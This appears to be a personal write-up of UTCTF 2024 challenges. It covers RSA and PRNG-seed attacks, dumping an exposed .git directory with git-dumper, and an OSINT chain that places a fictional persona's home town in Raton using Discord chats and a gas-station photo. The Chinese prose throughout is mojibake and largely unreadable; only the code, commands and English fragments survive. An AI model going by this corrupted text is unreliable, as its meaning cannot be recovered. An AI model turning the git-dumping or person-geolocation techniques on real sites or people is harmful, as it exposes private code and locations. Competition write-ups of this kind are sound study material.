# UTCTF 2024 ä¸ªäººé¢˜è§£

Lysithea 10583 45th

å¾·å…‹è¨æ–¯å·ç«‹å¤§å­¦çš„ä¸¤æ—¥æ ¡èµ›ï¼Œé¢˜é‡ä¸å¤§ä½†æ˜¯éš¾åº¦åœ¨æ ¡èµ›é‡Œç®—æ˜¯ä¸­ç­‰åä¸Šçš„ï¼Œmiscä»¥å¤–å„ä¸ªåˆ†ç±»åŸºæœ¬éƒ½è‡³å°‘ä¸€é“1000å¤§é¢˜ã€‚æˆ‘ä¹Ÿä¸€å¦‚æ—¢å¾€çš„åƒåœ¾é¢˜æ€æ‰‹ï¼Œä¼šåšçš„é¢˜å¤§å®¶åŸºæœ¬éƒ½ä¼šï¼Œè¢«åŠ¨æ€åˆ†å¹²åˆ°ä»20åæ‰åˆ°40åï¼ˆç¬¬ä¸€å20000åˆ†ï¼ŒåŸºæœ¬ä¸Šall clearäº†ï¼‰ï¼Œ1000åˆ†å¤§é¢˜åŸºæœ¬æ²¡æœ‰èƒ½åšå‡ºæ¥çš„ã€‚

ç¬¬ä¸€å¤©åŸºæœ¬åƒåœ¾é¢˜å…¨æ¸…äº†ï¼Œç¬¬äºŒå¤©ä¸“æ”»revçš„In the Darkå’Œpwnçš„Webserverï¼Œæœ‰ç‚¹åˆ†æ•£ç²¾åŠ›äº†ï¼Œå¦‚æœå…¨åŠ›æ‰“webserverè¯´ä¸å®šèƒ½æ‰“ä¸‹æ¥ã€‚

<!-- truncate -->

## Crypto
Cryptoåˆ†ç±»æ•´ä½“éš¾åº¦æ˜¯åä½çš„ï¼Œé™¤äº†æœ€åä¸€ä¸ªåé€†å‘çš„1000åˆ†é¢˜(`forgery`)çœ‹ä¸æ‡‚

### RSA-256
åŸºæœ¬æ˜¯ç­¾åˆ°é¢˜ã€‚RSA-256ä¹Ÿå°±æ˜¯ç”¨åˆ°å¤§æ•´æ•°åˆ†è§£çš„è´¨æ•°å¤§å°æ˜¯256ä½çš„ï¼Œè¿™ä¸ªå¤§å°çš„è´¨æ•°æ˜¯å¯ä»¥æš´åŠ›åˆ†è§£ï¼Œæˆ–è€…è¯´æŸ¥è¡¨çš„ï¼ˆ[factordb.com](https://factordb.com)ï¼‰

flagæ˜¯`utflag{just_send_plaintext}`ç¡®å®è¿™ç§çº§åˆ«çš„åŠ å¯†ä¸å¦‚ç›´æ¥ç»™æ˜æ–‡å¥½äº†

### numbers go brrr ï¼ˆ2é—®ï¼‰
è¿™é¢˜æ„Ÿè§‰åœ¨è€ƒä¼ªéšæœºä½†æ„Ÿè§‰è€ƒçš„ä¸æ·±å…¥ã€‚

ä½œè€…è‡ªå·±å®ç°äº†ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œä½†ç§å­èŒƒå›´åœ¨`randint(0, 100000)`ã€‚ä¹‹åç”¨è¿™ä¸ªä¼ªéšæœºç”Ÿæˆå¯†é’¥ï¼Œå¯¹ä¿¡æ¯è¿›è¡ŒAESåŠ å¯†ã€‚

ç¬¬ä¸€é—®ä½ å¯ä»¥æ— é™æ¬¡å¯¹è‡ªå·±çš„ä¿¡æ¯åŠ å¯†è·å¾—å¯†æ–‡ï¼Œæœ€åæœåŠ¡å™¨ä¼šè¿”å›flagçš„å¯†æ–‡ã€‚äº‹å®ä¸Šåªç”¨ä¸€æ®µæ˜æ–‡å°±å¯ä»¥çˆ†ç ´å‡ºéšæœºæ•°ç§å­ï¼Œç„¶åå°±çŸ¥é“åŠ å¯†flagæ—¶ä½¿ç”¨çš„keyäº†ï¼ˆæ³¨æ„ä¸¤ä¸ªkeyä¸ä¸€æ ·ï¼Œç¬¬äºŒä¸ªkeyæ˜¯ç¬¬ä¸€ä¸ªkeyçš„åç»­ï¼‰

ç¬¬äºŒé—®å‰é¢ä¸€æ ·å¯ä»¥æ— é™æ¬¡è·å¾—ä»»æ„ä¿¡æ¯å¯†æ–‡ï¼Œä¹‹åè¦çŒœkeyã€‚ä½†æ˜¯åŒæ ·ä¸€æ¬¡æ˜æ–‡å°±å¯ä»¥çˆ†å‡ºseedï¼Œç„¶åkeyå°±çŸ¥é“äº†ã€‚è¿™æ ·çš„çŒœä¸€å…±æœ‰ä¸‰æ¬¡ï¼Œä¹‹åç»™flagã€‚

> è¿™ä¸ªflagè¡¨æ˜å‡ºé¢˜äººä¹Ÿæ”¾å¼ƒæ²»ç–—äº†ï¼š`utflag{ok_you_are_either_really_lucky_or_you_solved_it_as_intended_yay}`


### bits and pieces
éå¸¸å•çº¯çš„RSAé¢˜ï¼Œç»™äº†ä¸‰å¯¹N, e, cå¯¹ï¼ŒNå¾ˆå¤§ï¼Œe=65537ï¼Œçœ‹ä¼¼æ— æ‡ˆå¯å‡»ã€‚

äº‹å®ä¸Šç¬¬äºŒç»„å’Œç¬¬ä¸‰ç»„çš„å…±äº«å…¬å› æ•°ï¼ˆ`gmpy2.gcd`ï¼‰ï¼Œå› è€Œå¯ä»¥ç›´æ¥åˆ†è§£ã€‚ç¬¬ä¸€ç»„æ²¡æ€ä¹ˆçœ‹å‡ºæ¥ï¼Œä½†æ”¾åˆ°yafué‡Œä¸€è·‘å°±å‡ºæ¥äº†ï¼Œå®é™…ä¸Šä¸¤ä¸ªå› æ•°å¤§å°ååˆ†æ¥è¿‘ï¼ˆNæœ¬èº«éå¸¸æ¥è¿‘ä¸€ä¸ªæ•´æ•°çš„å¹³æ–¹ï¼‰ï¼Œæ‰€ä»¥ä¹Ÿå¾ˆå®¹æ˜“åˆ†è§£ã€‚

### Cryptordle
æœ‰ç‚¹æ„æ€çš„ä¸€ä¸ªé¢˜ï¼Œç›¸å½“äºwordleã€‚é¢˜ç›®ä¼šæ ¹æ®ä¸€ä¸ªå­—å…¸ï¼ˆå¤§æ¦‚ç‡æ˜¯æœ‰æ„ä¹‰çš„è‹±æ–‡å•è¯ï¼‰ç”Ÿæˆä¸€ä¸ªäº”ä¸ªå­—æ¯çš„å•è¯ï¼Œç„¶åæˆ‘ä»¬æœ‰6æ¬¡æœºä¼šçŒœä¸­ã€‚æ¯æ¬¡çš„åé¦ˆè¯¸ä½å­—ç¬¦å·®æ¨¡31çš„ä¹˜ç§¯ã€‚
```python
response = 1
for x in range(5):
    a = ord(guess[x]) - ord('a')
    b = ord(answer[x]) - ord('a')
    response = (response * (a-b)) % 31
print(response)
```

è¿™ä¸ªé¢˜æˆ‘ç”¨çš„æ–¹æ³•æ˜¯æ¦‚ç‡æˆåŠŸçš„ï¼ˆæ‰€ä»¥ä¸æ˜¯é¢„æœŸè§£ï¼Œè‡³å°‘æ˜¯é¢„æœŸè§£çš„å¼±åŒ–ç‰ˆï¼‰ï¼Œæˆ‘ç”¨äº†ä¸€ä¸ªå¼±åŒ–çš„ç­–ç•¥ï¼Œæ„é€ äº”ç»„å›ºå®šè¾“å…¥ï¼Œé€šè¿‡5æ¬¡åé¦ˆå”¯ä¸€è§£ç®—ç­”æ¡ˆï¼ˆä¹‹æ‰€ä»¥æ˜¯å¼±åŒ–ï¼Œå› ä¸ºåå››æ¬¡å¯ä»¥é€šè¿‡ä¹‹å‰çš„ç»“æœä¼˜åŒ–è¾“å…¥ï¼Œè¿™ä¸ªåº”è¯¥å¯ä»¥ä¼˜åŒ–æˆ100%çš„æ–¹æ³•ï¼‰ã€‚å‡è®¾ç­”æ¡ˆä¸º`x1 x2 x3 x4 x5`ï¼Œè¿™é‡Œæ¯ä¸ªæ•°æ˜¯0-25çš„æ•´æ•°

- ç¬¬ä¸€è½®ç»™`aaaaa`ï¼Œè·å¾—çš„`O=x1*x2*x3*x4*x5`
- ç¬¬äºŒè½®ç»™`baaaa`ï¼Œè·å¾—`A=(x1-1)*x2*x3*x4*x5`ï¼Œåˆ™`O*inv(O-A)`å³`x1`ï¼Œå…¶ä¸­`inv`æ˜¯æ¨¡31æ„ä¹‰ä¸‹çš„é€†ã€‚
- ç¬¬ä¸‰å››äº”è½®ç»™`abaaa`ï¼Œ`aabaa`, `aaaba`ï¼ŒåŸºäºåŒæ ·åŸç†å¯ä»¥ç®—å‡º`x2,x3,x4`
- `x5`çš„å€¼å¯ä»¥ç›´æ¥`O * inv(x1*x2*x3*x4)`

è¿™ä¸ªæ–¹æ³•æˆåŠŸæ¡ä»¶æ˜¯æ¯ä¸€æ­¥éƒ½å¯ä»¥é€†ï¼Œæ±‚é€†çš„å­ä¸²ä¸èƒ½è¢«31æ•´é™¤ï¼ˆæˆ–è€…è¯´ï¼Œä¸èƒ½æœ‰aï¼‰ã€‚æˆ‘è®¤ä¸ºè¿™ä¸ªé¢˜åº”è¯¥æ˜¯å¯ä»¥é€šè¿‡ä¸€ç§æ„é€ ä¿è¯æ— è®ºè¦çŒœä»€ä¹ˆéƒ½èƒ½æˆåŠŸçš„ã€‚æˆ‘ä¸­é—´ä¹Ÿæƒ³è¿‡è¿™ä¸ªé¢˜æ˜¯ä¸æ˜¯èƒ½éšæœºè¾“å…¥+Z3è§£ç®—ï¼Œä¸è¿‡å¥½åƒè®¡ç®—é‡è¿˜æ˜¯å¤ªå¤§Z3æä¸å‡ºæ¥ï¼Œçœ‹æ¥è¿˜æ˜¯éœ€è¦ç²¾å¦™æ„é€ ã€‚

> æˆ‘ç°åœ¨åˆæƒ³äº†æƒ³ï¼Œæ˜¯ä¸æ˜¯è¦æ±‚è¢«çŒœçš„ç­”æ¡ˆé‡Œæ²¡æœ‰aå°±èƒ½çŒœå‡ºæ¥ï¼Ÿå¦‚æœè¿™æ ·é‚£ç”¨qè¿™æ ·çš„éå¸¸è§å­—æ¯æ¥ä½œä¸ºåŸºåº•å¯èƒ½æ›´å®¹æ˜“ã€‚

æ®è¯´ä¸»åŠæ–¹ä¸ºäº†å µæ¦‚ç‡æ€§çš„éé¢„æœŸä¸­é—´æ‰æŠŠé¢˜ç›®æ”¹æˆéœ€è¦çŒœä¸­3æ¬¡çš„ï¼Œç¬‘æ­»ã€‚

### simple signature
æœ‰ç‚¹ä¸çŸ¥æ‰€äº‘çš„é¢˜ï¼Œé¢˜ç›®ä¿¡æ¯åªè¯´äº†æ ¹æ®RSAå®ç°äº†ä¸ªç­¾åæœºåˆ¶ï¼Œç„¶åå°±åªç»™äº†ä¸€ä¸ªncã€‚è¿ä¸Šå»åï¼Œæ˜¯è¿™æ ·çš„ä¿¡æ¯ï¼š
```
Welcome to the signature generator!
This service generates signatures for nonnegative integer messages.
Today's RSA parameters are:
n = (ä¸€ä¸ªå¾ˆå¤§çš„æ•´æ•°)
e = 65537
Enter a message as an integer (enter 0 to stop):
```
ç„¶åæˆ‘ä»¬å¯ä»¥æ— é™æ¬¡è¾“å…¥æ•´æ•°ï¼ˆè™½ç„¶promptè¯´åªèƒ½è¾“å…¥éè´Ÿæ•°ï¼Œä½†æ˜¯æ˜¯å¯ä»¥è¾“å…¥çš„ï¼‰ï¼Œä¼¼ä¹ä¼šè¿›è¡ŒRSAåŠ å¯†è¿”å›Cã€‚å½“è¾“å…¥0åï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬æä¾›ä¸€ç»„æ²¡æœ‰è¾“å…¥è¿‡çš„æ•°å­—+ç­¾åã€‚

ä¸€å¼€å§‹æˆ‘æ²¡ä»€ä¹ˆæ€è·¯ï¼Œç›´åˆ°æˆ‘éšæœºfuzzå‡ºæ¥è¾“å…¥-1, 1, -1ä¹‹åï¼Œç»™å‡ºçš„å€¼ä¸€å®šæ˜¯1ã€‚åœ¨RSAåŠ å¯†è¿™ç§å¹³å‡æ•°å­—é•¿åº¦å¥½å‡ è¡Œçš„åŠ å¯†é‡Œå‡ºç°1è¿™ç§å¯†æ–‡ï¼Œä¸€å®šæ˜¯ä¸æ­£å¸¸çš„ï¼Œè¿™åŸºæœ¬åªä»£è¡¨ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯æ˜æ–‡æ˜¯1ã€‚

è™½ç„¶åˆ°è¿™ä¸€æ­¥å°±èƒ½æ‹¿flagäº†(`utflag{a1m05t_t3xtb00k_3x3rc153}`)ï¼Œä½†æˆ‘ä»¬ä»ç„¶æä¸æ‡‚è¿™åˆ°åº•æ˜¯ä»€ä¹ˆç®—æ³•ã€‚å¦å¤–`1, -1`ç»™å‡ºçš„ä¸€å®šæ˜¯`1, 0`ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‹¿çš„

## Forensics
å–è¯é‡Œæœ‰ä¸€äº›æŒºæœ‰æƒ³æ³•çš„é¢˜ï¼Œä½†æ˜¯æˆ‘å¼±å–è¯ã€‚å…±8ä¸ªé¢˜åšå‡º4ä¸ªã€‚

### Contracts
ä¸€çœ¼GGç­¾åˆ°é¢˜ã€‚PDFé‡Œè—äº†ä¸€å¼ å›¾ç‰‡ï¼ŒAcrobatæ‰“å¼€åï¼Œç¼–è¾‘æ¨¡å¼æ‹–å‡ºæ¥ï¼Œäººçœ¼OCRå³å¯

### A Very Professional Website
ç»™äº†ä¸€ä¸ªç½‘ç«™ï¼ŒåŸºæœ¬å•¥éƒ½æ²¡æœ‰ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘æ€ä¹ˆå°±æƒ³åˆ°çœ‹ä¸€çœ¼`/.git`çš„ï¼Œç»“æœæŠ¥403äº†ã€‚è¿™ä¸ªå¯æ˜¯éå¸¸å¤§çš„æ”¶è·ï¼Œè¯´æ˜å¯ä»¥ç›´æ¥è®¿é—®gitä»“åº“ï¼Œdumpå‡ºæ‰€æœ‰å†…å®¹ï¼ˆæˆ‘ç”¨çš„`git-dumper`ï¼‰

çœ‹ä¸€çœ¼å†å²è®°å½•é‡Œæ²¡æœ‰å¼‚å¸¸ï¼Œæ‰€ä»¥è¿˜æ˜¯æŠŠæ‰€æœ‰objectså…¨éƒ¨æ‰“å°å‡ºæ¥æ¯”è¾ƒå¥½ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å‘½ä»¤ï¼š
```bash
# use this to print all objects in git repo, including ref log
git rev-list --objects -g --no-walk --all
# or alternatively
git cat-file --batch-check --batch-all-objects
# use this to print
git cat-file -p 1d2961fb02140ea819212ac081b0291c323fd056
# in git ref log?
# utflag{gitR3fl0g}
```

### OSINT ï¼ˆ2/3é—®ï¼‰
åŒ…å«ä¸‰é—®çš„ä¸€ä¸ªæœ‰æ•…äº‹çº¿çš„å¼€ç›’é¢˜ï¼ŒæŒºæœ‰æ„æ€çš„ã€‚
#### OSINT1 (æ³„éœ²æ–‡æ¡£)
ç»™äº†ä¸€ä¸ªåä¸ºKAKUUå…¬å¸çš„é—¨æˆ·ä¸»é¡µï¼Œè¦æ±‚æˆ‘ä»¬å¯»æ‰¾è¿™å®¶å…¬å¸æ³„éœ²çš„æ–‡æ¡£ï¼ˆå…¬å¸å½“ç„¶æ˜¯å‡çš„ï¼Œä¸æ˜¯åŒåçš„æ—¥æœ¬å…¬å¸ï¼‰

ä¸€å¼€å§‹æˆ‘æé”™æ–¹å‘ï¼Œåœ¨ç½‘é¡µä¸Šæ‰¾äº†åŠå¤©ï¼Œè¿˜æ‰’å‡ºäº†ä»–ä»¬ç”¨çš„æ¨¡æ¿æ˜¯Bootstrap Arshaã€‚ä¸è¿‡è¿™æ¯•ç«Ÿä¸æ˜¯Webé¢˜ï¼Œå‡ºé¢˜äººä¹Ÿæ”¾å‡ºhintè¯´è¿™ä¸ªé¢˜æ˜¾ç„¶ä¸åº”è¯¥åœ¨å…¬å¸ä¸»é¡µä¸Šæ‰¾æ³„éœ²çš„æ–‡æ¡£ã€‚

åæ¥æˆ‘æ³¨æ„åˆ°ä¸»é¡µä¸Šï¼Œå…¬å¸äººå‘˜ä»‹ç»é‡Œï¼Œæåˆ°åä¸ºCole Minertonï¼ˆåé¢ç®€ç§°CMï¼‰çš„å‘˜å·¥è¿è¥ç€å…¬å¸çš„ç¤¾äº¤åª’ä½“ï¼Œäºæ˜¯æˆ‘å¼€å§‹google/duckduckgoæ‰¾è¿™ä¸ªäººã€‚ä¹‹åæˆ‘åœ¨å‡ ä¸ªåœ°æ–¹æ‰¾åˆ°äº†ä»–ã€‚
- [Youtube](https://www.youtube.com/@ColeMinerton)ä¸Šæœ‰ä¸€ä¸ªå·ï¼Œå…³æ³¨å¾ˆå°‘ï¼ˆè¯´æ˜æ˜¯ä¸ªäººå·ä¸æ˜¯ä¸“ä¸šè§†é¢‘å·ï¼‰ï¼Œå‘å¸ƒäº†ä¸€ä¸ªæ¸¸æˆçš„é€Ÿé€šè§†é¢‘ï¼Œåªæœ‰ä¸€ä¸ªäººäº’åŠ¨ï¼Œäº’åŠ¨é‚£ä¸ªäººå¥½åƒæ˜¯çœŸçš„æ˜¯æ¥äº’åŠ¨çš„ã€‚ä¸»é¡µç®€ä»‹æœ‰ä¸ªdiscordç¾¤èŠï¼Œä½†è¿™ä¸ªç¾¤èŠé‡Œç«Ÿç„¶æœ‰200å¤šäººï¼Œæœ‰ç‚¹åå¸¸ã€‚
- [twitter](https://twitter.com/ColeMinerton)ï¼ˆXï¼‰æœ‰å·ï¼Œæ•´ä¸ªè´¦å·åªæœ‰ä¸€æ¡æ¨ï¼Œåœ¨2æœˆ25æ—¥å·¦å³è¯´è‡ªå·±ä¸åœ¨è¿™é‡Œæ´»åŠ¨äº†ï¼Œæœ‰[linktree](https://linktr.ee/coleminerton)é“¾æ¥ï¼Œè¿˜æŒ‡å‘ä¸Šé¢è¯´çš„youtubeï¼Œä¸€ä¸ªredditï¼ˆå¥½åƒæ²¡ä»€ä¹ˆä¿¡æ¯ï¼‰ï¼Œå’Œä¸€ä¸ªåä¸ºMastodonçš„ç¤¾äº¤å¹³å°ï¼Œç±»ä¼¼facebookã€‚
- [Mastodon](https://mastodon.social/@coleminerton)ä¸Šè®°å½•åŸºæœ¬ä¹Ÿæ˜¯2æœˆ25æ—¥å·¦å³å¼€å§‹ï¼Œæœ‰å¤§æ¦‚7æ¡åŠ¨æ€ï¼Œå…¶ä¸­ä¸€æ¡æåˆ°äº†Kakuu Companyï¼Œè¯´æ˜æ‰¾å¯¹ä½ç½®äº†ã€‚

å…¶å®åˆ°è¿™é‡Œï¼ŒåŸºæœ¬ç¡®å®šé‚£ä¸ªdiscordæ˜¯é¢˜ç›®èŒƒå›´å†…çš„äº†ï¼Œå¯æƒœæˆ‘è¿™æ—¶çªå‘ç¤¾ææ¶ç–¾ï¼Œè¿Ÿè¿Ÿä¸æ•¢ç‚¹é‚€è¯·é“¾æ¥ï¼Œä¸‹äº†å¥½ä¹…å†³å¿ƒæ‰è¿›å»ï¼Œç»“æœæˆ‘æ˜¯æ²¡æœ‰æƒé™å‘è¨€çš„ï¼Œåªæœ‰ä¸€æ®µ2æœˆ25æ—¥-3æœˆ1æ—¥å·¦å³çš„ç¾¤èŠè®°å½•ï¼Œæ¶‰åŠCMå’Œä»–ä¸¤ä¸ªæœ‹å‹ï¼ˆä¹Ÿæ˜¯Mastodonå’Œä»–äº’åŠ¨çš„é‚£ä¸¤ä¸ªäººï¼‰ã€‚

å¯ä»¥åœ¨èŠå¤©è®°å½•é‡Œçœ‹åˆ°CMå’Œæœ‹å‹å¹é€¼æ—¶æŠŠè‡ªå·±ç­¾çš„åˆåŒç»™å‘å‡ºæ¥äº†ï¼ˆåº•ä¸‹è¿˜æœ‰äººæ¥é¾™ğŸ’€çš„ååº”ï¼Œæˆ‘çœ‹äº†æˆ‘ä¹Ÿæœ‰æƒé™æ¥é¾™ä¹Ÿå°±æ¥äº†ä¸€ä¸‹ï¼‰ï¼Œflagæ˜¯æ˜æ–‡åœ¨å…¶ä¸­çš„ã€‚
![](./osint_pic/osint_discord_CM_contract.png)

#### OSINT2 (åŸå¸‚æ£€ç´¢)
ç¬¬äºŒé—®è¦æˆ‘ä»¬æ‰¾å‡ºè¿™ä¸ªäººä½åœ¨å“ªä¸ªå·å“ªä¸ªåŸå¸‚ï¼ˆä»¥åŸå¸‚ï¼Œå·ç¼©å†™ï¼Œzip codeæ ¼å¼æäº¤ï¼‰

åˆ°è¿™ä¸€æ­¥æ—¶éœ€è¦ä»”ç»†æ‹ä¸€ä¸‹discordç¾¤èŠé‡Œçš„æœ‰æ•ˆä¿¡æ¯ï¼Œçœ‹çœ‹å“ªä¸€æ­¥æ˜¯åŒ…å«äº†ä½ç½®ç›¸å…³çš„ä¿¡æ¯ã€‚
- CMåœ¨2æœˆ26æ—¥å·¦å³å»Angel Fireæ»‘é›ªäº†ï¼Œè¿™ä¸€æ­¥æ²¡æœ‰ä½å€ä¿¡æ¯
- CMæåˆ°è‡ªå·±çš„å…¬å¸æ˜¯è¿œç¨‹å±…å®¶åŠå…¬ï¼Œæ‰€ä»¥é—¨æˆ·ç«™çš„å…¬å¸åœ°å€ï¼ˆçº½çº¦ï¼‰å’Œé—®é¢˜æ— å…³äº†
- CMå’Œæœ‹å‹è¯´æ‰“ç®—å‘¨æœ«ï¼ˆ3æœˆ2æ—¥ï¼‰å»Tellurideï¼ˆTellurideåœ¨ç§‘ç½—æ‹‰å¤šï¼‰æ—…æ¸¸ï¼ŒæœŸé—´å¯ä»¥å¾—çŸ¥CMå’Œæœ‹å‹æ²¡ä½åœ¨ä¸€ä¸ªåŸå¸‚ï¼Œä¹Ÿéƒ½ä¸åœ¨Tellurideã€‚
- 3æœˆ2æ—¥ï¼ŒCMåœ¨å‡ºå‘ä¹‹å‰è¿˜åœ¨åŠ ç­ï¼Œå¹¶ä¸”åœ¨02:49è¯´è‡ªå·±åˆšåˆšåŠ ç­å®Œè¦å‡ºå‘ï¼Œè¿˜è¦7å°æ—¶æ‰èƒ½åˆ°è¾¾Tellurideã€‚
![](./osint_pic/osint_discord_CM.png)
- ä¸æ­¤åŒæ—¶ï¼Œå¤§çº¦åœ¨02:48ï¼ŒCMåœ¨Mastodonå‘äº†ä¸€å¼ åœ¨åŠ æ²¹ç«™åŠ æ²¹çš„ç…§ç‰‡
![](./osint_pic/gas.jpg)

ç”±æ­¤æˆ‘ä»¬å¯ä»¥ç¡®å®šï¼Œæ­¤æ—¶CMè¿˜åœ¨è‡ªå·±å®¶æ‰€åœ¨çš„åŸå¸‚ï¼Œè¿™ä¸ªåŠ æ²¹ç«™æ‰€åœ¨çš„åŸå¸‚å°±æ˜¯ç­”æ¡ˆã€‚è¿™å¼ ç…§ç‰‡è™½ç„¶æœ¬èº«ä¸å«ä½ç½®å…ƒæ•°æ®ï¼Œä½†æ˜¯å¯ä»¥å¾—åˆ°è¿™äº›ä¿¡æ¯ï¼š
- ä¸­é—´ç”µçº¿æ†ä¸Šæœ‰New Mexico Lotteryçš„å¹¿å‘Šï¼Œè¯´æ˜æ˜¯æ–°å¢¨è¥¿å“¥å·ï¼ˆæ–°å¢¨è¥¿å“¥å·å’Œç§‘ç½—æ‹‰å¤šå—åŒ—ç›¸é‚»ï¼Œç¡®å®æ˜¯åˆç†çš„è‡ªé©¾æ¸¸å»å¤„ï¼Œ7ä¸ªå°æ—¶è½¦ç¨‹èƒ½åˆ°çš„åœ°æ–¹ï¼‰ã€‚
- èƒŒæ™¯æœ‰è·¯ç‰ŒCimarronï¼ŒæŸ¥äº†ä¸€ä¸‹è¿™ä¸ªæ˜¯Raton City, Colfax Countyçš„ä¸€ä¸ªé•‡å­ã€‚äºæ˜¯æŠŠè¿™ä¸‰ä¸ªåœ°åéƒ½è¯•ä¸€éï¼ŒRatonæ˜¯å¯¹çš„ã€‚

ç¬¬ä¸‰é—®æ˜¯è¦æ‰¾CMçš„IPåœ°å€ï¼Œæš‚æ—¶æ²¡æ€è·¯ï¼Œæ²¡åšã€‚

### Gibberishï¼ˆæœªåšå‡ºï¼‰
> é¢˜å¹²ï¼š`Help! I'm trying to spy on my lover but they're not typing in any language I'm familiar with!`ï¼Œç„¶åç»™äº†ä¸€æ®µUSBæµé‡åŒ…ï¼Œæ˜ç¤ºäº†æ˜¯æŸç§é”®ç›˜ã€‚

> hint:
> - I made this on a qwerty keyboard but I would recommend buying something more specialized if you were to do this all day. You'll know you're on the right track when you find something that rhymes with a word in the challenge description.
> - It's not a cipher.
> - I used a 6-key rollover keyboard. You might want to double check some of your words.

æµé‡åŒ…åŒ…å«ä¸€äº›USB descriptorçš„æŠ¥æ–‡ï¼Œèƒ½çœ‹å‡ºæ¥é”®ç›˜æ˜¯Razer Huntsman V2 Tenkeylessã€‚HIDé”®ç›˜æŠ¥æ–‡ä¸€èˆ¬æ˜¯8å­—èŠ‚æœ‰æ•ˆä¿¡æ¯ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚æ˜¯åŠŸèƒ½é”®çŠ¶æ€ï¼ˆctrl, shiftç­‰ï¼‰ï¼Œåå…­ä¸ªå­—èŠ‚æ˜¯è¾“å…¥ç¼“å†²åŒºã€‚å› ä¸ºè¿™ç§é”®ç›˜å¯ä»¥åŒæ—¶å¯¹6ä¸ªæŒ‰é”®ä½œå‡ºååº”ï¼Œæ‰€ä»¥è¿™ç§é”®ç›˜è¢«ç§°ä¸º6 key rollover (6KRO)ã€‚å’Œå¾ˆå¤šé”®ç›˜æŠ¥æ–‡åªæœ‰ç¬¬ä¸‰å­—èŠ‚æœ‰è®°å½•ä¸åŒï¼Œè¿™ä¸ªæŠ¥æ–‡æ˜¯ä¼šå‡ºç°æˆè‚¡æˆè‚¡å‡ºç°ï¼Œä¸€èˆ¬æ˜¯åä¸€ä¸ªæŠ¥æ–‡åœ¨å‰ä¸€ä¸ªæŠ¥æ–‡åŸºç¡€ä¸Šå¢åŠ æˆ–è€…å‡å°‘ä¸€ä¸ªå­—ç¬¦ï¼ˆå¶å°”ä¹Ÿä¼šåŒæ—¶å¢å‡ï¼Œæˆ–è€…å‡å°‘ä¸¤ä¸ªå­—ç¬¦ä¹‹ç±»çš„ï¼‰ï¼Œè¿™åº”è¯¥è¡¨ç¤ºå¿«é€Ÿæ‰“å­—æ—¶ï¼Œå‡ ä¸ªé”®è¢«åŒæ—¶æŒ‰ä¸‹ã€‚ä½†æ˜¯ï¼Œæˆ‘å¹¶ä¸èƒ½ç¡®å®šè®¡ç®—æœºè¯†åˆ«æ˜¯æŒ‰é”®å‡ºç°çš„é¡ºåºï¼Œè¿˜æ˜¯æ¶ˆå¤±çš„é¡ºåºï¼ˆæˆ‘çŒœå‡ºç°çš„é¡ºåºæ›´åˆç†ï¼ŒæŒ‰è¯´è¿™åº”è¯¥å±äºä¸€ä¸ªç¼“å†²åŒºï¼Œå¤„ç†å®ŒåæŠŠæŒ‰é”®ä»ç¼“å†²åŒºå»é™¤ï¼‰ã€‚æŒ‰é”®é™¤äº†a-z, 0-9ï¼Œè¿˜æœ‰ç›¸å½“çš„ç‰¹æ®Šç¬¦å·ã€é€€æ ¼ç­‰

è¿™ä¸ªé¢˜æœ€ç²¾é«“çš„ç‚¹åœ¨äºï¼Œå¦‚æœæŒ‰[ä¸€èˆ¬HIDæ–‡æ¡£](https://d1.amobbs.com/bbs_upload782111/files_47/ourdev_692986N5FAHU.pdf)ï¼ˆæ²¡æ‰¾åˆ°æ›´å¥½çš„æ›´å®˜æ–¹çš„æ–‡æ¡£ï¼‰ä¸­ï¼Œå­—èŠ‚ä¸é”®ä½æ˜ å°„è¡¨ç¼–å†™è¿˜åŸç¨‹åºï¼Œä¼šå‘ç°å‡ºæ¥çš„æ˜¯ä¹±ç ï¼Œæ­£å¦‚é¢˜ç›®æ ‡é¢˜æ‰€è¯´ã€‚æˆ‘å…¶å®ä¸€ä¸Šæ¥ï¼ˆhintå‡ºæ¥ä¹‹å‰ï¼‰å°±æ€€ç–‘è¿™ä¸ªæ˜¯éæ ‡å‡†é”®ç›˜ï¼Œæ¯”å¦‚æˆ‘å¬è¯´å¾·è¯­é”®ç›˜å°±æ˜¯QZERTYçš„ã€‚ä½†å¾ˆå¯æƒœçš„æ˜¯ï¼ŒWikipediaä¸Šæåˆ°çš„å¤§éƒ¨åˆ†éæ ‡å‡†é”®ä½éƒ½åªæ˜¯QWERTYçš„å°å˜ä½“ï¼Œè¦ä¹ˆå°±æ˜¯è‡ªå·±çš„æ–‡å­—ï¼ˆè¥¿é‡Œå°”å­—æ¯ã€éæ‹‰ä¸å­—ç¬¦ç­‰ï¼‰ï¼Œå°‘æ•°å‡ ä¸ªé«˜åº¦æ‰“ä¹±çš„é”®ä½å¸ƒå±€ä¹Ÿæ— æ³•è®©æˆ‘è¿™é‡Œçš„ä¹±ç å˜æˆæœ‰æ„ä¹‰çš„è‹±æ–‡ï¼Œæ‰€ä»¥å°±æ²¡å†å°è¯•ã€‚æœªçŸ¥é”®ç›˜å¸ƒå±€+æœªçŸ¥çš„6KROå¤„ç†é¡ºåºï¼Œè¿™åº”è¯¥æ˜¯æ¯”è¾ƒå›°éš¾çš„ç‚¹ã€‚

### Study Musicï¼ˆæœªåšå‡ºï¼‰
è¿™ä¸ªå°±æ˜¯é‚£ä¸ªæ²¹ç®¡10hå¾ªç¯çŒ«çŒ«è§†é¢‘çš„éŸ³é¢‘éšå†™é¢˜ï¼ˆé“¾æ¥ï¼š[https://youtu.be/1Cbaa6dO2Yk](https://youtu.be/1Cbaa6dO2Yk)ï¼‰ã€‚Auditionçœ‹åŠå¤©æ²¡æœ‰ä»»ä½•æ€è·¯ï¼ŒMATLABå…‰è½½å…¥å°±è¦åå‡ åˆ†é’Ÿæ¶ˆè€—12Gå†…å­˜ã€‚ä¼°è®¡åšè‡ªç›¸å…³åèƒ½çœ‹å‡ºç‚¹ä»€ä¹ˆï¼Œä¸è¿‡ç®—äº†ã€‚

## Reverse Engineering
ç®—ä¸Šcryptoé‡Œé‚£ä¸ªrevé¢˜ï¼Œä¸€å…±å…­ä¸ªé¢˜ï¼Œåšå‡ºä¸€åŠï¼ˆåŒ…æ‹¬ä¸€ä¸ªbeginneré¢˜ï¼‰ã€‚

